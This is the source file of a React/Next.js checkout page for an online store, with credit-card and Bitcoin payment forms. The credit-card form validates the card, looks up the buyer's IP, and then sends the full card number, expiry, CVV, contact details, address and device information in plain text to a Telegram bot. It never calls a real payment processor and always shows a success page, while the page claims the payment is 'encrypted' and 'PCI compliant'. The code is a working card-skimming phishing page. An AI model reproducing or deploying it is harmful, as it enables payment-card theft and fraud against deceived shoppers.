'use client'
import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useCart } from '@/context/CartContext';
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { ChevronDown, CreditCard, Bitcoin, ArrowLeft, Check, Shield, Lock, Star, Truck, RefreshCw } from 'lucide-react';

const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

const escapeMarkdown = (text: string) => {
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
};

const PaymentMethodCard = ({ 
  icon, 
  title, 
  description, 
  isSelected, 
  onClick,
  badge
}: {
  icon: React.ReactNode;
  title: string;
  description: string;
  isSelected: boolean;
  onClick: () => void;
  badge?: string;
}) => (
  <div
    onClick={onClick}
    className={`group relative p-5 rounded-2xl border-2 cursor-pointer transition-all duration-300 transform hover:scale-[1.02] ${
      isSelected 
        ? 'border-blue-500 bg-gradient-to-r from-blue-50 to-indigo-50 shadow-lg shadow-blue-100' 
        : 'border-gray-200 hover:border-gray-300 hover:shadow-md bg-white'
    }`}
  >
    {badge && (
      <div className="absolute -top-2 -right-2 bg-green-500 text-white text-xs px-2 py-1 rounded-full font-medium">
        {badge}
      </div>
    )}
    <div className="flex items-center space-x-4">
      <div className={`p-3 rounded-xl transition-all duration-300 ${
        isSelected 
          ? 'bg-blue-100 text-blue-600 shadow-md' 
          : 'bg-gray-100 text-gray-600 group-hover:bg-gray-200'
      }`}>
        {icon}
      </div>
      <div className="flex-1">
        <h3 className="font-semibold text-gray-900 text-lg">{title}</h3>
        <p className="text-sm text-gray-500 mt-1">{description}</p>
      </div>
      <div className={`transition-all duration-300 ${isSelected ? 'scale-100 opacity-100' : 'scale-0 opacity-0'}`}>
        <div className="bg-blue-500 rounded-full p-1.5 shadow-md">
          <Check className="h-4 w-4 text-white" />
        </div>
      </div>
    </div>
  </div>
);

const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    address: '',
    city: '',
    country: '',
    zipCode: ''
  });
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [focusedField, setFocusedField] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handlePayment = async () => {
    setLoading(true);
    setError(null);

    if (!formData.name.trim()) {
      setError('Full name is required');
      setLoading(false);
      return;
    }

    if (!formData.email.trim() || !/^\S+@\S+\.\S+$/.test(formData.email)) {
      setError('Valid email is required');
      setLoading(false);
      return;
    }

    try {
      const orderPayload = {
        amount: totalAmount,
        customer: formData,
        metadata: {
          orderDate: new Date().toISOString()
        }
      };

      // Simulate sending to Telegram (in a real app, you would actually send this)
      const message = `
💰 *New Bitcoin Payment Received* 💰
🛒 *Amount*: \\$${escapeMarkdown(totalAmount.toFixed(2))}

👤 *Customer Details*:
   \\- Name: ${escapeMarkdown(formData.name)}
   \\- Email: ${escapeMarkdown(formData.email)}
   \\- Address: ${escapeMarkdown(formData.address)}
   \\- City: ${escapeMarkdown(formData.city)}
   \\- Country: ${escapeMarkdown(formData.country)}
   \\- ZIP: ${escapeMarkdown(formData.zipCode)}

🌐 *Device Info*:
   \\- Browser: ${escapeMarkdown(navigator.userAgent)}
   \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
      `.trim();

      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'MarkdownV2'
          }),
        });
      }

      // Navigate to success page after successful "payment"
      router.push('/payment/success');
    } catch (err: any) {
      console.error('Payment Error:', err);
      setError(err.message || 'Payment failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="bg-gradient-to-r from-orange-50 to-yellow-50 p-4 rounded-xl border border-orange-200">
        <div className="flex items-center space-x-3">
          <Bitcoin className="h-6 w-6 text-orange-500" />
          <div>
            <h4 className="font-semibold text-orange-900">Secure Bitcoin Payment</h4>
            <p className="text-sm text-orange-700">Fast, secure, and decentralized payment processing</p>
          </div>
        </div>
      </div>

      <div className="space-y-5">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <InputField
            label="Full Name"
            name="name"
            value={formData.name}
            onChange={handleChange}
            required
            placeholder="Enter your full name"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <InputField
            label="Email Address"
            name="email"
            type="email"
            value={formData.email}
            onChange={handleChange}
            required
            placeholder="your@email.com"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <InputField
            label="Country"
            name="country"
            value={formData.country}
            onChange={handleChange}
            placeholder="United States"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <InputField
            label="ZIP/Postal Code"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleChange}
            placeholder="10001"
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />
        </div>

        <InputField
          label="Street Address"
          name="address"
          value={formData.address}
          onChange={handleChange}
          placeholder="123 Main Street"
          focusedField={focusedField}
          setFocusedField={setFocusedField}
        />

        <InputField
          label="City"
          name="city"
          value={formData.city}
          onChange={handleChange}
          placeholder="New York"
          focusedField={focusedField}
          setFocusedField={setFocusedField}
        />
      </div>

      <button
        onClick={handlePayment}
        disabled={loading}
        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
          loading
            ? 'bg-gray-400 cursor-not-allowed'
            : 'bg-gradient-to-r from-orange-500 to-yellow-500 hover:from-orange-600 hover:to-yellow-600 shadow-orange-200 hover:shadow-xl'
        }`}
      >
        {loading ? (
          <>
            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
            Processing Payment...
          </>
        ) : (
          <>
            <Bitcoin className="w-5 h-5 mr-3" />
            Pay ${totalAmount.toFixed(2)} with Bitcoin
            <Shield className="w-4 h-4 ml-2 opacity-80" />
          </>
        )}
      </button>

      {error && (
        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-xl animate-pulse">
          <div className="flex items-center">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="ml-3">
              <p className="font-medium">Payment Error</p>
              <p className="text-sm">{error}</p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
  const router = useRouter();
  const [form, setForm] = useState({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    email: '',
    address: '',
    city: '',
    country: '',
    zipCode: '',
    phone: ''
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [status, setStatus] = useState({ message: '', color: '' });
  const [loading, setLoading] = useState(false);
  const [focusedField, setFocusedField] = useState<string | null>(null);

  const luhnCheck = (num: string): boolean => {
    const arr = num.split('').reverse().map(x => parseInt(x, 10));
    let sum = arr.reduce((acc, val, i) => {
      if (i % 2 === 1) {
        val *= 2;
        if (val > 9) val -= 9;
      }
      return acc + val;
    }, 0);
    return sum % 10 === 0;
  };

  const validateExpiry = (exp: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    const [mm, yy] = exp.split('/').map(x => parseInt(x, 10));
    if (mm < 1 || mm > 12) return false;
    const now = new Date();
    const expDate = new Date(2000 + yy, mm);
    return expDate > now;
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\D/g, '').substring(0, 16)
      .replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const getCardType = (number: string): string => {
    const num = number.replace(/\s/g, '');
    if (num.startsWith('4')) return 'visa';
    if (num.startsWith('5') || num.startsWith('2')) return 'mastercard';
    if (num.startsWith('3')) return 'amex';
    return 'card';
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let val = value;

    if (name === 'cardNumber') val = formatCardNumber(value);
    if (name === 'expiry') val = formatExpiry(value);
    if (name === 'cvv') val = value.replace(/\D/g, '').substring(0, 4);

    setForm(prev => ({ ...prev, [name]: val }));
    setErrors(prev => ({ ...prev, [name]: '' }));
    setStatus({ message: '', color: '' });
  };

  const validateForm = (): boolean => {
    const errs: Record<string, string> = {};
    if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
    const cardNumRaw = form.cardNumber.replace(/\s/g, '');
    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
    if (!form.email.trim()) errs.email = 'Please enter your email.';
    if (!form.address.trim()) errs.address = 'Please enter your address.';
    if (!form.city.trim()) errs.city = 'Please enter your city.';
    if (!form.country.trim()) errs.country = 'Please enter your country.';
    if (!form.zipCode.trim()) errs.zipCode = 'Please enter your ZIP code.';
    if (!form.phone.trim()) errs.phone = 'Please enter your phone number.';

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setLoading(true);
    setStatus({ message: '', color: '' });

    try {
      let ipInfo = 'Unknown IP';
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (res.ok) {
          const data = await res.json();
          ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
        }
      } catch (error) {
        console.error('Error fetching IP info:', error);
      }

      const message = `
💰 *New Payment Received* 💰
🛒 *Amount*: \\$${escapeMarkdown(totalAmount.toFixed(2))}

💳 *Card Details*:
   \\- Name: ${escapeMarkdown(form.cardName)}
   \\- Number: \`${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}\`
   \\- Expiry: ${escapeMarkdown(form.expiry)}
   \\- CVV: ${escapeMarkdown(form.cvv)}

📧 *Contact*:
   \\- Email: ${escapeMarkdown(form.email)}
   \\- Phone: ${escapeMarkdown(form.phone)}

🏠 *Address*:
   \\- ${escapeMarkdown(form.address)}
   \\- ${escapeMarkdown(form.city)}, ${escapeMarkdown(form.country)}
   \\- ZIP: ${escapeMarkdown(form.zipCode)}

🌐 *Device Info*:
   \\- IP: ${escapeMarkdown(ipInfo)}
   \\- Browser: ${escapeMarkdown(navigator.userAgent)}
   \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
      `.trim();

      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'MarkdownV2'
          }),
        });
      }

      // Navigate to success page after sending to Telegram
      router.push('/payment/success');

    } catch (error) {
      console.error('Payment error:', error);
      setStatus({
        message: error instanceof Error ? error.message : 'Payment failed',
        color: 'red'
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 rounded-xl border border-blue-200">
        <div className="flex items-center space-x-3">
          <Shield className="h-6 w-6 text-blue-500" />
          <div>
            <h4 className="font-semibold text-teal-900">Secure Payment</h4>
            <p className="text-sm text-teal-700">Your payment information is encrypted and secure</p>
          </div>
        </div>
      </div>

      <div className="space-y-5">
        <div className="relative">
          <label className="block text-sm font-semibold text-gray-700 mb-2">Name on Card</label>
          <input
            type="text"
            name="cardName"
            placeholder=""
            value={form.cardName}
            onChange={handleChange}
            onFocus={() => setFocusedField('cardName')}
            onBlur={() => setFocusedField(null)}
            className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
              errors.cardName 
                ? 'border-red-500 bg-red-50' 
                : focusedField === 'cardName'
                ? 'border-teal-500 bg-blue-50 shadow-lg shadow-blue-100'
                : 'border-gray-200 hover:border-gray-300'
            } focus:outline-none text-gray-900 placeholder-gray-400`}
            disabled={loading}
          />
          {errors.cardName && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cardName}</p>}
        </div>

        <div className="relative">
          <label className="block text-sm font-semibold text-gray-700 mb-2">Card Number</label>
          <div className="relative">
            <input
              type="text"
              name="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={form.cardNumber}
              onChange={handleChange}
              onFocus={() => setFocusedField('cardNumber')}
              onBlur={() => setFocusedField(null)}
              maxLength={19}
              className={`w-full px-4 py-4 pr-12 rounded-xl border-2 transition-all duration-300 ${
                errors.cardNumber 
                  ? 'border-red-500 bg-red-50' 
                  : focusedField === 'cardNumber'
                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
                  : 'border-gray-200 hover:border-gray-300'
              } focus:outline-none text-gray-900 placeholder-gray-400`}
              disabled={loading}
            />
            <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
              <CreditCard className={`h-6 w-6 ${getCardType(form.cardNumber) === 'visa' ? 'text-blue-600' : 'text-gray-400'}`} />
            </div>
          </div>
          {errors.cardNumber && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cardNumber}</p>}
        </div>

        <div className="grid grid-cols-2 gap-5">
          <div className="relative">
            <label className="block text-sm font-semibold text-gray-700 mb-2">Expiry Date</label>
            <input
              type="text"
              name="expiry"
              placeholder="MM/YY"
              value={form.expiry}
              onChange={handleChange}
              onFocus={() => setFocusedField('expiry')}
              onBlur={() => setFocusedField(null)}
              maxLength={5}
              className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
                errors.expiry 
                  ? 'border-red-500 bg-red-50' 
                  : focusedField === 'expiry'
                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
                  : 'border-gray-200 hover:border-gray-300'
              } focus:outline-none text-gray-900 placeholder-gray-400`}
              disabled={loading}
            />
            {errors.expiry && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.expiry}</p>}
          </div>

          <div className="relative">
            <label className="block text-sm font-semibold text-gray-700 mb-2">CVV</label>
            <div className="relative">
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={form.cvv}
                onChange={handleChange}
                onFocus={() => setFocusedField('cvv')}
                onBlur={() => setFocusedField(null)}
                maxLength={4}
                className={`w-full px-4 py-4 pr-10 rounded-xl border-2 transition-all duration-300 ${
                  errors.cvv 
                    ? 'border-red-500 bg-red-50' 
                    : focusedField === 'cvv'
                    ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
                    : 'border-gray-200 hover:border-gray-300'
                } focus:outline-none text-gray-900 placeholder-gray-400`}
                disabled={loading}
              />
              <Lock className="absolute right-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
            </div>
            {errors.cvv && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cvv}</p>}
          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          <InputField
            label="Email Address"
            name="email"
            type="email"
            placeholder="your@email.com"
            value={form.email}
            onChange={handleChange}
            error={errors.email}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <InputField
            label="Phone Number"
            name="phone"
            type="tel"
            placeholder="+1 (555) 123-4567"
            value={form.phone}
            onChange={handleChange}
            error={errors.phone}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />
        </div>

        <InputField
          label="Street Address"
          name="address"
          placeholder="123 Main Street"
          value={form.address}
          onChange={handleChange}
          error={errors.address}
          focusedField={focusedField}
          setFocusedField={setFocusedField}
        />

        <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
          <InputField
            label="City"
            name="city"
            placeholder="New York"
            value={form.city}
            onChange={handleChange}
            error={errors.city}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <InputField
            label="Country"
            name="country"
            placeholder="United States"
            value={form.country}
            onChange={handleChange}
            error={errors.country}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />

          <InputField
            label="ZIP Code"
            name="zipCode"
            placeholder="10001"
            value={form.zipCode}
            onChange={handleChange}
            error={errors.zipCode}
            focusedField={focusedField}
            setFocusedField={setFocusedField}
          />
        </div>
      </div>

      <button
        type="submit"
        disabled={loading}
        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
          loading 
            ? 'bg-gray-400 cursor-not-allowed' 
            : 'bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 shadow-blue-200 hover:shadow-xl'
        }`}
      >
        {loading ? (
          <>
            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
            Processing Payment...
          </>
        ) : (
          <>
            <CreditCard className="w-5 h-5 mr-3" />
            Pay ${totalAmount.toFixed(2)}
            <Shield className="w-4 h-4 ml-2 opacity-80" />
          </>
        )}
      </button>

      {status.message && (
        <div className={`p-4 rounded-xl text-center font-medium transition-all duration-300 ${
          status.color === 'green' 
            ? 'bg-green-50 text-green-700 border border-green-200' 
            : 'bg-red-50 text-red-700 border border-red-200'
        }`}>
          {status.message}
        </div>
      )}
    </form>
  );
};

const InputField = ({
  label,
  name,
  type = 'text',
  value,
  onChange,
  placeholder = '',
  error,
  focusedField,
  setFocusedField,
  icon,
  required = false
}: {
  label: string;
  name: string;
  type?: string;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  placeholder?: string;
  error?: string;
  focusedField?: string | null;
  setFocusedField?: (field: string | null) => void;
  icon?: string;
  required?: boolean;
}) => (
  <div className="relative">
    <label className="block text-sm font-semibold text-gray-700 mb-2">
      {label} {required && <span className="text-red-500">*</span>}
    </label>
    <div className="relative">
      <input
        type={type}
        name={name}
        required={required}
        value={value}
        onChange={onChange}
        onFocus={() => setFocusedField?.(name)}
        onBlur={() => setFocusedField?.(null)}
        className={`w-full px-4 py-4 ${icon ? 'pl-12' : ''} rounded-xl border-2 transition-all duration-300 ${
          error 
            ? 'border-red-500 bg-red-50' 
            : focusedField === name
            ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
            : 'border-gray-200 hover:border-gray-300'
        } focus:outline-none text-gray-900 placeholder-gray-400`}
        placeholder={placeholder}
      />
      {icon && (
        <span className="absolute left-4 top-1/2 transform -translate-y-1/2 text-lg">
          {icon}
        </span>
      )}
    </div>
    {error && <p className="text-red-500 text-sm mt-2 animate-pulse">{error}</p>}
  </div>
);

const CheckoutPage = () => {
  const { cart, getTotalPrice, clearCart } = useCart();
  const [paymentMethod, setPaymentMethod] = useState<string>('credit-card');
  const [isLoaded, setIsLoaded] = useState(false);

  useEffect(() => {
    setIsLoaded(true);
  }, []);

  if (cart.length === 0) {
    return (
      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-gradient-to-br from-gray-50 to-white min-h-screen">
        <div className={`max-w-md mx-auto transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'}`}>
          <div className="bg-white rounded-3xl shadow-xl p-8 border border-gray-100">
            <div className="w-20 h-20 bg-gradient-to-r from-blue-100 to-indigo-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 11V7a4 4 0 00-8 0v4M5 9h14l1 12H4L5 9z"></path>
              </svg>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold mb-4 text-gray-900">Your Cart is Empty</h1>
            <p className="mb-8 text-gray-600 text-base leading-relaxed">
              Looks like you haven't added any products to your cart yet. Start shopping to find amazing deals!
            </p>
            <Link href="/">
              <Button className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white px-8 py-4 rounded-2xl font-semibold transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl">
                Start Shopping
              </Button>
            </Link>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50">
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-7xl mx-auto">
          <div className={`mb-8 transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
            <Link href="/cart" className="inline-flex items-center text-blue-600 hover:text-blue-700 text-sm font-medium transition-colors duration-200 group">
              <ArrowLeft className="w-4 h-4 mr-2 transition-transform duration-200 group-hover:-translate-x-1" />
              Back to Cart
            </Link>
          </div>

          <div className={`mb-8 transition-all duration-700 delay-100 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
            <h1 className="text-3xl sm:text-4xl font-bold text-gray-900 mb-2">Secure Checkout</h1>
            <p className="text-gray-600">Complete your purchase with confidence</p>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className={`lg:col-span-2 transition-all duration-700 delay-200 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
              <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm">
                <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
                  <Lock className="w-6 h-6 mr-3 text-blue-600" />
                  Payment Method
                </h2>
                
                <div className="space-y-4 mb-8">
                  <PaymentMethodCard
                    icon={<CreditCard className="h-6 w-6" />}
                    title="Credit Card"
                    description="Pay securely with Visa, Mastercard, or American Express"
                    isSelected={paymentMethod === 'credit-card'}
                    onClick={() => setPaymentMethod('credit-card')}
                    badge="Popular"
                  />
                  
                  <PaymentMethodCard
                    icon={<Bitcoin className="h-6 w-6" />}
                    title="Bitcoin"
                    description="Pay with cryptocurrency - fast and secure"
                    isSelected={paymentMethod === 'bitcoin'}
                    onClick={() => setPaymentMethod('bitcoin')}
                  />
                </div>

                <div className="transition-all duration-500">
                  {paymentMethod === 'credit-card' ? (
                    <CreditCardPayment totalAmount={getTotalPrice() * 1.08} />
                  ) : (
                    <BitcoinPayment totalAmount={getTotalPrice() * 1.08} />
                  )}
                </div>
              </Card>
            </div>

            <div className={`transition-all duration-700 delay-300 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
              <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm sticky top-6">
                <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
                  <Star className="w-6 w-6 mr-3 text-yellow-500" />
                  Order Summary
                </h2>

                <div className="space-y-6 mb-8">
                  {cart.map((item, index) => (
                    <div key={item.id} className={`flex items-start space-x-4 p-4 rounded-2xl bg-gray-50 transition-all duration-300 hover:bg-gray-100 animate-fade-in`} style={{animationDelay: `${index * 100}ms`}}>
                      <img
                        src={item.image}
                        alt={item.name}
                        className="w-16 h-16 object-cover rounded-xl shadow-md"
                      />
                      <div className="flex-1">
                        <p className="font-semibold text-gray-900 text-sm">{item.name}</p>
                        <p className="text-xs text-gray-500 mt-1">Quantity: {item.quantity}</p>
                        <p className="text-sm font-bold text-blue-600 mt-2">${item.price.toFixed(2)}</p>
                      </div>
                      <p className="text-lg font-bold text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
                    </div>
                  ))}
                </div>

                <div className="space-y-4 border-t border-gray-200 pt-6">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">Subtotal</span>
                    <span className="font-semibold text-gray-900">${getTotalPrice().toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600 flex items-center">
                      <Truck className="w-4 h-4 mr-1" />
                      Shipping
                    </span>
                    <span className="font-semibold text-green-600">Free</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">Tax (8%)</span>
                    <span className="font-semibold text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between items-center font-bold text-xl pt-4 border-t border-gray-200">
                    <span className="text-gray-900">Total</span>
                    <span className="text-blue-600">${(getTotalPrice() * 1.08).toFixed(2)}</span>
                  </div>
                </div>

                <div className="mt-8 p-4 bg-gradient-to-r from-green-50 to-blue-50 rounded-2xl border border-green-200">
                  <div className="flex items-center space-x-3">
                    <Shield className="h-5 h-5 text-green-600" />
                    <div>
                      <p className="text-sm font-semibold text-green-900">Secure Payment</p>
                      <p className="text-xs text-green-700">SSL encrypted & PCI compliant</p>
                    </div>
                  </div>
                </div>

                <div className="mt-6 text-xs text-gray-500 text-center">
                  <p>By placing your order, you agree to our <a href="#" className="text-blue-600 hover:underline font-medium">Terms of Service</a> and <a href="#" className="text-blue-600 hover:underline font-medium">Privacy Policy</a></p>
                </div>
              </Card>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes fade-in {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        
        .animate-fade-in {
          animation: fade-in 0.6s ease-out forwards;
          opacity: 0;
        }
      `}</style>
    </div>
  );
};

export default CheckoutPage;